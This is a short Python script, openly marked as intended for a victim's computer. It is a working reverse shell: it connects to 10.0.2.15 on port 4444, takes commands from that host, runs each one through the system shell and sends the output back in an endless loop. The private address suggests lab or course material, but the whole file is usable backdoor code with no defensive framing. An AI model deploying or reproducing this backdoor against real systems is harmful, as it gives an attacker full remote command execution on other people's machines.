#! /usr/bin/env python
# NOTICE: this script is intended for the victim's computer.
# Compatibility: Python 3 only.

import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.15", 4444))

while True:
    command_received = connection.recv(1024).decode(errors="replace")
    command_result = execute_system_command(command_received)
    connection.send(command_result)

connection.close()
